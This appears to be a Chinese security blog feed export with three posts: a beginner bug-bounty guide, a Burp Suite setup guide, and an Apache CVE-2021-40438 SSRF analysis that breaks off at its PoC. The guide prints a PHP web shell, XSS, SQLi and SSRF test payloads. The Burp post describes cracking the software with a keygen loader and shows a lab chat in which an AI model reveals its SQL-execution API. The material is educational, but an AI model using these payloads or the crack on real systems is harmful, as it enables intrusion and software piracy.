        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>欢迎来到惊心动魄的漏洞赏金狩猎世界 - 在这里，发现软件中的故障不仅是一种爱好，而且是通往潜在财富和认可的门户！想象一下，成为一名数字侦探，解开大多数人甚至不会注意到的谜团，并因此获得奖励。在本指南中，我们将揭示漏洞赏金猎杀的基础知识，逐步演练如何挖掘常见漏洞，并分享一些不错的资源来帮助您入门。系好安全带，这将是一次虫子般的旅程！</p><h1 id="什么是漏洞赏金狩猎？"><a href="#什么是漏洞赏金狩猎？" class="headerlink" title="什么是漏洞赏金狩猎？"></a>什么是漏洞赏金狩猎？</h1><p>漏洞赏金狩猎就像是网络安全领域的超级英雄，但没有华丽的西装。它涉及嗅探和报告系统、应用程序或网站中的安全漏洞。公司运行漏洞赏金计划来引诱道德黑客（像您一样）发现并报告这些弱点，这有助于他们加强安全性。作为回报，您会从技术社区获得奖励、认可或至少是虚拟的击掌。</p><h1 id="第-1-步：了解-Web-安全的基础知识"><a href="#第-1-步：了解-Web-安全的基础知识" class="headerlink" title="第 1 步：了解 Web 安全的基础知识"></a>第 1 步：了解 Web 安全的基础知识</h1><p>在开始搜寻错误之前，您需要熟悉 Web 安全的基础知识。将其视为学习网络侦探的 ABC。</p><p><a href="https://miro.medium.com/v2/resize:fit:920/1*HwtA25QBjmqTZajT9kWYNg.png" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:920/1*HwtA25QBjmqTZajT9kWYNg.png"></a></p><ul><li><strong>HTTP &amp; HTTPS</strong>：这些就像网络的邮政服务。HTTP 是标准协议，而 HTTPS 是它的安全表亲，用于加密浏览器和服务器之间的数据。始终使用 HTTPS — 这就像在 Web 上系安全带一样。</li><li><strong>OWASP 前 10 大</strong>风险：这是您对 10 大 Web 安全风险的备忘单。熟悉这些麻烦制造者：</li><li><strong>SQL 注入 （SQLi）：</strong>当黑客把你的数据库当作玩具来玩的时候。</li><li><strong>跨站点脚本 （XSS）：</strong>当错误的脚本在您的网站上崩溃时。</li><li><strong>损坏的身份验证</strong>：当您的登录系统像纸锁一样安全时。</li><li><strong>敏感数据泄露</strong>：当您的私人信息像在广告牌上一样被公开时。</li><li><strong>XML 外部实体 （XXE）：</strong>当您的 XML 文件成为偷偷摸摸的麻烦制造者时。</li><li><strong>访问控制失效</strong>：当用户访问的内容超出他们应该访问的内容时，例如闯入 VIP 部分。</li><li><strong>安全配置错误</strong>：当您的安全设置像拼图一样混淆时。</li><li><strong>跨站点请求伪造 （CSRF）：</strong>当攻击者让您的站点做它不应该做的事情时。</li><li><strong>不安全的反序列化</strong>：当正在处理的数据全部混乱时。</li><li><strong>使用具有已知漏洞的组件</strong>：使用过时的部件时，就像把漏水的水桶带到派对上。</li><li><strong>网络基础知识</strong>：了解 IP 地址、DNS 和数据如何通过网络传输。这就像了解信件是如何到达您的邮箱的，但需要更多的技术性杂项。</li></ul><h1 id="第-2-步：熟悉交易工具"><a href="#第-2-步：熟悉交易工具" class="headerlink" title="第 2 步：熟悉交易工具"></a>第 2 步：熟悉交易工具</h1><p>每个超级英雄都需要他们的小工具，对于漏洞赏金猎杀，您有一些很酷的工具：</p><p><a href="https://miro.medium.com/v2/resize:fit:1134/1*esB4fV2xoa2DafsCJYfoPA.png" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1134/1*esB4fV2xoa2DafsCJYfoPA.png"></a></p><ul><li><strong>Burp Suite</strong>：将其视为 HTTP 请求和响应的放大镜。它功能强大，如果您刚刚起步，它包含在社区版本中。查看 Burp Suite Community Edition 和 Burp Suite 初学者教程。</li><li><strong>Nmap</strong>：扫描网络和发现开放端口的首选工具。它就像你寻找弱点的雷达。探索 <a href="https://nmap.org/">Nmap 官方网站</a>和 Nmap 初学者教程。</li><li><strong>OWASP ZAP</strong>：一种开源安全扫描程序，可帮助您发现漏洞。这就像有一个不眠不休的伙伴。查看 OWASP ZAP 官方网站和 OWASP ZAP 用户指南。</li><li><strong>Google Dorking</strong>：使用高级搜索运算符来挖掘互联网上暴露的信息。这就像使用一个超级强大的搜索引擎来寻找隐藏的宝石。阅读 Google Dorking 指南。</li></ul><h1 id="第-3-步：选择漏洞赏金平台"><a href="#第-3-步：选择漏洞赏金平台" class="headerlink" title="第 3 步：选择漏洞赏金平台"></a>第 3 步：选择漏洞赏金平台</h1><p>现在，您实际上在哪里寻找这些虫子呢？以下是一些可以开始使用的平台：</p><p><a href="https://miro.medium.com/v2/resize:fit:1086/1*1fDF2jOW4bmr5igxvHdEYQ.png" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1086/1*1fDF2jOW4bmr5igxvHdEYQ.png"></a></p><ul><li><strong>HackerOne</strong>：拥有来自大公司的项目的大联盟。查看 <a href="https://www.hackerone.com/">HackerOne</a> 及其初学者指南。</li><li><strong>Bugcrowd</strong>：另一个有各种程序可供探索的顶级平台。访问 <a href="https://www.bugcrowd.com/">Bugcrowd</a> 和 Bugcrowd 大学。</li><li><strong>Synack</strong>：一个具有申请流程的更独特的平台。如果您觉得花哨，请前往 <a href="https://www.synack.com/">Synack</a>。</li><li><strong>Open Bug Bounty</strong>：即使您没有正式的计划，也专注于负责任的披露。查看 <a href="https://www.openbugbounty.org/">Open Bug Bounty</a>。</li></ul><h1 id="第-4-步：查找漏洞-—-分步示例"><a href="#第-4-步：查找漏洞-—-分步示例" class="headerlink" title="第 4 步：查找漏洞 — 分步示例"></a>第 4 步：查找漏洞 — 分步示例</h1><p>让我们戴上侦探的帽子，深入研究一些经典的漏洞：</p><h1 id="示例-1：跨站点脚本-（XSS）"><a href="#示例-1：跨站点脚本-（XSS）" class="headerlink" title="示例 1：跨站点脚本 （XSS）"></a><strong>示例 1：跨站点脚本 （XSS）</strong></h1><p>XSS 就像一个恶作剧者，将恶意脚本注入网页。以下是捕捉它们的方法：</p><ul><li><strong>识别输入字段</strong>：查找可以键入内容的地方 - 搜索框、评论部分或个人资料。</li><li><strong>Inject Test Script</strong>：删除一个简单的脚本，例如：</li><li><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></li><li>进入 Input 字段并点击 Submit。</li><li><strong>检查执行</strong>：如果您看到弹出一个警报框，则您发现了 XSS 漏洞。恭喜！</li><li><strong>报告漏洞</strong>：在报告中描述您的发现 — 说明您是如何做到的、影响，并提供修复漏洞的建议。这就像写一份侦探报告。</li></ul><p><strong>示例：测试搜索字段</strong></p><ul><li>在搜索框中输入<code>&lt;script&gt;alert(&#39;Test&#39;)&lt;/script&gt;</code></li><li>如果出现警报框，则表示存在 XSS 漏洞。</li></ul><h1 id="示例-2：远程代码执行-（RCE）"><a href="#示例-2：远程代码执行-（RCE）" class="headerlink" title="示例 2：远程代码执行 （RCE）"></a><strong>示例 2：远程代码执行 （RCE）</strong></h1><p>RCE 是指黑客可以从远处在服务器上运行命令。以下是找到它的方法：</p><ul><li><strong>查找用户输入：</strong>查找用户可以上传文件或输入命令的位置。</li><li><strong>测试文件上传</strong>：上传带有可执行代码扩展名的文件，如 或 .请尝试以下有效负载：<code>.php``.asp</code></li><li><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li><li><strong>执行命令</strong>：通过 Web 访问上传的文件，并使用 URL 参数传递命令。例如：<code>[http://example.com/uploads/yourfile.php?cmd=ls](http://example.com/uploads/yourfile.php?cmd=ls)</code></li><li><strong>观察输出</strong>：如果命令运行并且您看到输出，则服务器容易受到 RCE 的攻击。</li><li><strong>报告漏洞</strong>：详细说明您上传文件、执行命令的方式以及潜在影响。</li></ul><p><strong>示例：上传 PHP 文件</strong></p><ul><li>上传名为 的内容 的文件。<code>shell.php``&lt;?php phpinfo(); ?&gt;</code></li><li>通过以下方式访问它以查看它是否执行。<code>http://example.com/uploads/shell.php</code></li></ul><h1 id="示例-3：服务器端请求伪造-（SSRF）"><a href="#示例-3：服务器端请求伪造-（SSRF）" class="headerlink" title="示例 3：服务器端请求伪造 （SSRF）"></a><strong>示例 3：服务器端请求伪造 （SSRF）</strong></h1><p>SSRF 是指攻击者诱骗服务器向内部资源发出请求。以下是嗅探它的方法：</p><ul><li><strong>识别 URL 参数</strong>：查找接受 URL 或 IP 地址的参数。</li><li><strong>注入恶意 URL</strong>：使用指向内部资源的 URL 进行测试，例如：</li><li><code>http://localhost/admin [http://127.0.0.1](http://127.0.0.1/)</code></li><li><strong>Observe Response</strong>：检查服务器是否从内部 URL 返回数据。</li><li><strong>报告漏洞</strong>：说明您如何注入 URL、您观察到的响应以及潜在影响。</li></ul><p><strong>示例：操作 URL 参数</strong></p><ul><li>将参数更改为其他内部地址。<code>http://example.com/fetch?url=http://localhost</code></li></ul><h1 id="示例-4：SQL-注入-（SQLi）"><a href="#示例-4：SQL-注入-（SQLi）" class="headerlink" title="示例 4：SQL 注入 （SQLi）"></a>示例 4：SQL 注入 （SQLi）</h1><p><strong>SQL 注入 （SQLi）</strong> 涉及将恶意 SQL 查询注入应用程序以操纵数据库。以下是测试 SQLi 的方法：</p><ol><li><strong>识别输入字段</strong>：查找可在其中输入与数据库交互的数据的字段，例如登录表单或搜索栏。</li><li><strong>Inject SQL Payload</strong>：使用 SQL 注入有效负载测试输入字段。例如：</li></ol><ul><li><code>&#39; OR &#39;1&#39;=&#39;1</code></li></ul><ol><li><strong>观察响应</strong>：如果应用程序返回意外结果或数据库错误，则可能容易受到 SQLi 的攻击。</li><li><strong>Report the Vulnerability（报告漏洞</strong>）：提供注入、响应和潜在影响的详细信息。</li></ol><p><strong>示例</strong>：测试登录表单：</p><ul><li>输入 username 和 password。如果它让您登录，则该站点容易受到攻击。<code>admin&#39; OR &#39;1&#39;=&#39;1</code></li></ul><h1 id="第-5-步：向社区学习"><a href="#第-5-步：向社区学习" class="headerlink" title="第 5 步：向社区学习"></a>第 5 步：向社区学习</h1><p>加入漏洞赏金社区可以提高您的技能和知识：</p><ol><li><strong>文章</strong>： 阅读经验丰富的猎人的文章可以深入了解不同的技术和方法。像 Hack The Box Write-Ups 这样的网站提供有价值的信息。</li><li><strong>论坛和 Discord 频道</strong>：加入漏洞赏金猎人的论坛和 Discord 频道。这些平台非常适合提出问题和分享知识。</li></ol><ul><li>Bugcrowd 论坛</li><li>HackerOne 社区</li></ul><ol><li><strong>博客和视频</strong>：关注网络安全博客和 YouTube 频道以获取更新和教程。</li></ol><ul><li><a href="https://securityweekly.com/">安全周刊</a></li><li><a href="https://www.bugbountyhub.io/">Bug Bounty 中心</a></li><li><a href="https://www.youtube.com/c/LiveOverflow">LiveOverflow 的 YouTube 频道</a></li></ul><h1 id="有关漏洞赏金狩猎的其他提示"><a href="#有关漏洞赏金狩猎的其他提示" class="headerlink" title="有关漏洞赏金狩猎的其他提示"></a>有关漏洞赏金狩猎的其他提示</h1><ol><li><strong><em>了解范围</em></strong><em>：每个漏洞赏金计划都有一个定义的范围，用于指定哪些应用程序、域或功能在测试范围内。始终阅读并遵守程序的规则，以避免测试未经授权的区域。</em></li></ol><ul><li><em>HackerOne 范围策略</em></li></ul><p><strong><em>2. 保持更新</em></strong><em>：网络安全形势一直在发展。通过关注行业新闻和更新，了解最新的漏洞、工具和技术。</em></p><ul><li><a href="https://www.cvedetails.com/"><em>CVE 详细信息</em></a></li><li><a href="https://www.exploit-db.com/"><em>漏洞利用数据库</em></a></li></ul><p><strong><em>3. 合乎道德地实践</em></strong><em>：始终负责任地使用您的技能。尊重每个漏洞赏金计划的规则，避免对系统或用户造成伤害。</em></p><p><strong><em>4. 记录所有内容</em></strong><em>：详细记录您的发现，包括重现漏洞的步骤、影响和任何缓解建议。这将帮助您编写更好的报告并与项目经理进行有效沟通。</em></p><p><strong><em>5. 明智地使用自动化</em></strong><em>：虽然自动化工具可以帮助识别漏洞，但手动测试对于发现复杂问题至关重要。将自动化用作手动分析的补充，而不是替代品。</em></p><h1 id="示例场景：漏洞赏金搜寻的实际应用"><a href="#示例场景：漏洞赏金搜寻的实际应用" class="headerlink" title="示例场景：漏洞赏金搜寻的实际应用"></a>示例场景：漏洞赏金搜寻的实际应用</h1><h1 id="场景-1：在搜索页面上查找-XSS"><a href="#场景-1：在搜索页面上查找-XSS" class="headerlink" title="场景 1：在搜索页面上查找 XSS"></a>场景 1：在搜索页面上查找 XSS</h1><p><strong>分步示例</strong>：</p><ol><li><strong>导航到 Search Page</strong>：打开目标应用程序的搜索页面。</li><li><strong>测试输入字段</strong>：在搜索框中，输入 。<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></li><li><strong>提交并观察</strong>：单击搜索按钮并观察是否弹出警报框。</li><li><strong>验证并报告</strong>：如果脚本执行，则表示存在 XSS 漏洞。编写一份报告，详细说明受影响的 URL、使用的有效负载和影响。</li></ol><h1 id="场景二：通过文件上传利用-RCE"><a href="#场景二：通过文件上传利用-RCE" class="headerlink" title="场景二：通过文件上传利用 RCE"></a>场景二：通过文件上传利用 RCE</h1><p><strong>分步示例</strong>：</p><ol><li><strong>查找文件上传功能</strong>：查找允许文件上传的应用程序部分，例如头像或文档上传功能。</li><li><strong>准备恶意文件</strong>：创建包含以下内容的 PHP 文件：</li></ol><ul><li><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li></ul><ol><li><strong>Upload the File（上传文件</strong>）：将 PHP 文件上传到服务器。</li><li><strong>访问文件</strong>：通过 URL（例如 ）访问文件以执行命令。<code>http://example.com/uploads/malicious.php?cmd=ls</code></li><li><strong>验证执行：</strong>如果您看到命令的输出，则服务器容易受到 RCE 的攻击。报告问题，并提供有关文件上传过程和执行的命令的详细信息。</li></ol><h1 id="场景-3：通过-URL-参数利用-SSRF"><a href="#场景-3：通过-URL-参数利用-SSRF" class="headerlink" title="场景 3：通过 URL 参数利用 SSRF"></a>场景 3：通过 URL 参数利用 SSRF</h1><p><strong>分步示例</strong>：</p><ol><li><strong>查找 URL 参数</strong>：在应用程序中查找接受用户输入的 URL 参数，例如 URL 获取功能。</li><li><strong>Inject Internal URLs</strong>：在参数中输入 like 或 的 URL。<code>http://localhost/admin``http://127.0.0.1</code></li><li><strong>检查响应</strong>：观察应用程序是否从内部 URL 或服务返回信息。</li><li><strong>报告漏洞</strong>：记录 URL 参数、注入的负载和响应。</li></ol><h1 id="场景-4：登录表单中的-SQL-注入"><a href="#场景-4：登录表单中的-SQL-注入" class="headerlink" title="场景 4：登录表单中的 SQL 注入"></a>场景 4：登录表单中的 SQL 注入</h1><p><strong>分步示例</strong>：</p><ol><li><strong>找到登录表单</strong>：在目标网站上找到登录表单。</li><li><strong>Inject SQL Payload（注入 SQL 负载</strong>）：输入用户名和密码。<code>admin&#39; OR &#39;1&#39;=&#39;1</code></li><li><strong>提交表单</strong>：单击登录，查看您是否获得了未经授权的访问权限。</li><li><strong>Document and Report</strong>：如果成功，则报告 SQL 注入以及有关有效负载及其效果的详细信息。</li></ol><h1 id="链接和资源"><a href="#链接和资源" class="headerlink" title="链接和资源"></a>链接和资源</h1><h2 id="学习平台和教程"><a href="#学习平台和教程" class="headerlink" title="学习平台和教程"></a>学习平台和教程</h2><ul><li><strong><em>Hacker101</em></strong><em>：</em> <a href="https://www.hacker101.com/"><em>Hacker101 — 免费在线安全培训</em></a></li><li><strong><em>PortSwigger Web Security Academy</em></strong><em>：免费学习 Web 安全</em></li><li><strong><em>Bugcrowd 大学</em></strong><em>：免费漏洞赏金培训</em></li><li><strong><em>OWASP （Open Web Application Security Project）：</em></strong><a href="https://owasp.org/"><em>OWASP 资源</em></a></li></ul><h2 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h2><ul><li><strong><em>Hack The Box</em></strong><em>：</em><a href="https://www.hackthebox.com/"><em>Hack The Box — 练习网络安全</em></a></li><li><strong><em>TryHackMe</em></strong><em>：</em> <a href="https://tryhackme.com/"><em>TryHackMe — 学习网络安全</em></a></li><li><strong><em>VulnHub</em></strong><em>：</em><a href="https://www.vulnhub.com/"><em>VulnHub — 设计易受攻击</em></a></li><li><strong><em>CTFtime</em></strong><em>：</em><a href="https://ctftime.org/"><em>Capture The Flag 事件</em></a></li></ul><h2 id="漏洞赏金计划和平台"><a href="#漏洞赏金计划和平台" class="headerlink" title="漏洞赏金计划和平台"></a>漏洞赏金计划和平台</h2><ul><li><strong><em>HackerOne</em></strong><em>：</em> <a href="https://www.hackerone.com/"><em>HackerOne — 漏洞赏金平台</em></a></li><li><strong><em>Bugcrowd</em></strong><em>：</em> <a href="https://www.bugcrowd.com/"><em>Bugcrowd — 查找和报告 Bug</em></a></li><li><strong><em>Synack</em></strong><em>：</em> <a href="https://www.synack.com/"><em>Synack — 托管的 Bug 赏金</em></a>计划</li><li><strong><em>Cobalt</em></strong><em>：</em><a href="https://cobalt.io/"><em>Cobalt — 渗透测试即服务</em></a></li></ul><h2 id="工具和资源"><a href="#工具和资源" class="headerlink" title="工具和资源"></a>工具和资源</h2><ul><li><strong><em>Burp Suite</em></strong><em>：Burp Suite — Web 漏洞扫描程序</em></li><li><strong><em>OWASP ZAP（Zed 攻击代理）：</em></strong><a href="https://www.zaproxy.org/"><em>OWASP ZAP — 免费安全扫描程序</em></a></li><li><strong><em>Nmap</em></strong><em>：</em> <a href="https://nmap.org/"><em>Nmap — 网络扫描器</em></a></li><li><strong><em>Nikto</em></strong><em>： Nikto — Web 服务器扫描仪</em></li></ul><h2 id="学习和社区"><a href="#学习和社区" class="headerlink" title="学习和社区"></a>学习和社区</h2><ul><li><strong><em>黑客新闻</em></strong><em>：</em><a href="https://thehackernews.com/"><em>随时了解安全新闻</em></a></li><li><strong><em>Krebs on Security （安全性</em></strong><em>）：</em> <a href="https://krebsonsecurity.com/"><em>Krebs on Security 博客</em></a></li><li><strong><em>Reddit — NetSec</em></strong><em>：</em><a href="https://www.reddit.com/r/netsec/"><em>NetSec Subreddit</em></a></li><li><strong><em>Twitter — 关注安全专家</em></strong><em>：</em><a href="https://twitter.com/"><em>在 Twitter 上关注安全专家列表</em></a></li></ul><h2 id="文档和报告"><a href="#文档和报告" class="headerlink" title="文档和报告"></a>文档和报告</h2><ul><li><strong><em>Exploit-DB</em></strong><em>：</em> <a href="https://www.exploit-db.com/"><em>漏洞利用数据库 — 漏洞利用</em></a></li><li><strong><em>CVE 详细信息</em></strong><em>：</em><a href="https://www.cvedetails.com/"><em>CVE 详细信息 — 漏洞数据库</em></a></li><li><strong><em>安全焦点</em></strong><em>：</em><a href="https://www.securityfocus.com/"><em>安全焦点 — 漏洞数据库</em></a></li></ul><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>漏洞赏金猎人就像一个有趣的寻宝游戏，用于查找 Web 上的安全漏洞。如果您遵守规则、做好笔记并明智地使用您的工具，这很令人兴奋，并且会非常有益。想象自己是一个拯救世界的超级英雄，但你得到的不是斗篷，而是键盘。保持您的冒险道德，像藏宝图一样记录您的发现，并将自动化作为您值得信赖的伙伴，而不是您唯一的工具。祝您狩猎愉快，愿您能找到像大海捞针一样难以捉摸的虫子！🚀💻🔍</p><p>进一步的学习和实践：</p><ul><li><strong>漏洞赏金教程</strong>：<a href="https://www.hacker101.com/">Hacker101</a></li><li><strong>CTF 平台</strong>：<a href="https://www.hackthebox.com/">Hack The Box</a>、<a href="https://tryhackme.com/">TryHackMe</a></li><li><strong>网络安全博客</strong>：<a href="https://thehackernews.com/">The Hacker News</a>、<a href="https://krebsonsecurity.com/">Krebs on Security</a></li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite指南</title>
      <link href="/2024/11/13/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/"/>
      <url>/2024/11/13/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>推荐下载最新版本的 BurpSuite，<a href="https://portswigger.net/burp/releases#professional">官方下载地址</a></p></li><li><p>最新的里面自己携带了 JDK, 避免 JDK 版本不匹配的问题</p></li><li><p>注册机 <a href="/../assets/img/image-81.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-81.png" alt="alt text"></a>,可以去<a href="https://leonooo13.github.io//site/">Site</a><strong>ByteSec</strong>获取</p></li><li><p>修改 BurpSuitePro.vmoptions 文件内容<a href="/../assets/img/image-82.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-82.png" alt="alt text"></a> 注意注册机器名称一致</p></li><li><p>启动<a href="/../assets/img/image-83.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-83.png" alt="alt text"></a></p></li><li><p>为了可以直接使用 Burpsuite 可以修改同名文件下的的<br><code>BurpSuitePro.vmoptions</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enter one VM parameter per line</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">For example, to adjust the maximum memory usage to 512 MB, uncomment the following line:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-Xmx512m</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">To include another file, uncomment the following line:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-include-options [path to other .vmoption file]</span></span><br><span class="line"></span><br><span class="line">-XX:MaxRAMPercentage=50</span><br><span class="line">-include-options settings.vmoptions</span><br><span class="line">-include-options user.vmoptions</span><br><span class="line">--add-opens=java.desktop/javax.swing=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.lang=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED</span><br><span class="line">-javaagent:BurpLoaderKeygen.jar</span><br><span class="line">-noverify</span><br><span class="line">-Xmx2048m</span><br></pre></td></tr></table></figure></li></ol><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p><a href="/../assets/img/image-78.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-78.png" alt="alt text"></a></p><ol><li>看板</li><li>目标</li><li>代理</li><li>重放</li><li>外带</li><li>随机检测</li><li>编码</li><li>对比</li><li>日志</li><li>扩展</li></ol><h2 id="看板-Dashboard"><a href="#看板-Dashboard" class="headerlink" title="看板 Dashboard"></a>看板 Dashboard</h2><ol><li>扫描和实时任务</li></ol><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ol><li>macos 中的字体<br>使用默认字体 英文等宽+中文平方 绝对是最好的，再加上Burpsuite官方对macos支持其实更加友好</li><li>windows 中的字体<br>如果使用 windows 中的默认字体会有 英文不等宽，如果使用一些编程字体，可以解决英文不等宽的问题，但是会引入中文字体不能正确渲染的问题，所以需要我们选择 一款字体，支持等宽支持中文</li></ol><p>加上本身我非常喜欢 JerBrains 的字体，最终选择下面这款字体。<br>JBMapleMono <a href="https://github.com/SpaceTimee/Fusion-JetBrainsMapleMono">https://github.com/SpaceTimee/Fusion-JetBrainsMapleMono</a></p><blockquote><p>By the Way</p></blockquote><p>这里还有几个字体备选</p><ol><li>等距更纱黑体 -&gt; 用过一段时间 西文渲染有点奇怪</li><li>Maple Mono -&gt; 太过圆润</li></ol><p>所以 最终选择 Jt Maple<br>目前来看还是一个不错的选择</p><p><a href="/../assets/img/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/image.png" title="alt text" class="gallery-item"><img src="/../assets/img/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/image.png" alt="alt text"></a></p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>对于一个 web 应用安全工程师来说，整体打交道最多的就是 BP，所以熟练使用 BP 是对工资效率有巨大的提升的。</p><p>常用的有</p><p><code>cmd + R</code> 发送到 Repeat 模块，可以修改 HTTP请求的参数，很常用的</p><p><code>cmd + E</code> Repeat 中的HTTP请求进行发送，默认是 cmd+Enter 但是我更喜欢用左手完成这个操作，所以把他变更成 <code>cmd+E</code>（enter），默认的 <code>cmd+E</code> 是 explain this 这个是收费的功能</p><p>其他好像也没啥常用，</p><h3 id="Repeat"><a href="#Repeat" class="headerlink" title="Repeat"></a>Repeat</h3><blockquote><p>新增加的功能<br>custom actions 顾名思义 自动话的操作</p></blockquote><ol><li>询问ai 可以访问那些接口</li></ol><p>CONNECTED:– Now chatting with Arti Ficial –<br>You:what APIs you have access to<br>Arti Ficial:I have access to the following APIs:</p><ol><li><code>functions.password_reset</code>: This API allows me to send password reset emails to users.</li><li><code>functions.debug_sql</code>: This API allows me to execute raw SQL commands on the database.</li><li><code>functions.product_info</code>: This API allows me to retrieve information about the products we sell.<br>System:— Disconnected —</li></ol><p><a href="/../assets/img/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/image-1.png" title="alt text" class="gallery-item"><img src="/../assets/img/2024-09-03-BurpSuite-%E6%8C%87%E5%8D%97/image-1.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WeSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APACHE_CVE-2021-40438-SSRF漏洞分析复现</title>
      <link href="/2024/11/13/APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/11/13/APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件：</p><p>r-&gt;filename的前6个字符等于proxy:<br>r-&gt;filename的字符串中含有关键字unix:<br>unix:关键字后的部分含有字符|<br>当满足这三个条件后，将unix:后面的内容进行解析，设置成uds_path的值；将字符|后面的内容，设置成rurl的值。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null</p><p>也就是说，我们只需要在unix:与|之间传入内容长度大概超过4092的字符串，就能构造出uds_path为null的结果，让Apache不再发送请求给unix套接字。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET 